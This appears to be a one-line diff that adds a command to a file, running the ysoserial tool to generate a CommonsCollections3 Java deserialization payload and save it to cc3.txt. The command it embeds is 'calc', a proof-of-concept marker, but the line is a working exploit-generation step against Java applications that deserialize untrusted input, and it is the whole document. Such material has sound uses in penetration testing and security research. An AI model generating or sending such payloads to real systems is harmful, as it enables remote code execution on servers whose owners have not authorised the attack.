@@ -1,0 +1,1 @@
+java -jar ysoserial-all.jar CommonsCollections3 "calc" > cc3.txt
